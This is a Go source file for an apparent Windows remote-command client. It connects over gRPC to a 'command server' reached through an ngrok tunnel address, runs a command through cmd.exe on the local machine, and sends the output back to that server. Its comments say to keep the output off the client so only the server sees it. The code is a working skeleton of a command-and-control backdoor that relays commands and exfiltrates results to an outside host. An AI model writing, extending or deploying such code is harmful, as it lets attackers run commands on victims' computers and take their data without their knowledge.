package main

import (
	"context"
	"log"
	"os/exec"

	"github.com/cardfaux/windows-connect/grpcapi"
	"google.golang.org/grpc"
)

func main() {
	// Connect to the gRPC server
	conn, err := grpc.Dial("2.tcp.ngrok.io:14296", grpc.WithInsecure())
	if err != nil {
		log.Fatalf("Failed to connect to server: %v", err)
	}
	defer conn.Close()

	log.Println("Connected to command server.")

	// Create a new client
	client := grpcapi.NewEchoServiceClient(conn)

	// Send a test command to the server
	command := "dir" // You can change this to any other command
	req := &grpcapi.CommandRequest{
		Command: command,
	}

	// Send the request to the server and get the response
	resp, err := client.ExecuteCommand(context.Background(), req)
	if err != nil {
		log.Fatalf("Error while executing command: %v", err)
	}

	// Actual command execution on the client (Windows)
	cmd := exec.Command("cmd", "/C", command) // Executing the command using cmd.exe
	output, err := cmd.CombinedOutput()      // Get the combined output (stdout + stderr)

	// Check for execution errors
	if err != nil {
		log.Printf("Error executing command on client: %v\n", err)
		log.Printf("Command error output: %s\n", string(output))
		return
	}

	// Do not log the output on the client, only send it to the server
	resp.Output = string(output)

	// Send the execution result back to the server (only server will see the output)
	_, err = client.ExecuteCommand(context.Background(), &grpcapi.CommandRequest{
		Command: string(output),
	})
	if err != nil {
		log.Fatalf("Error sending output back to server: %v", err)
	}

	log.Println("Execution complete. Output sent to the server.")
}
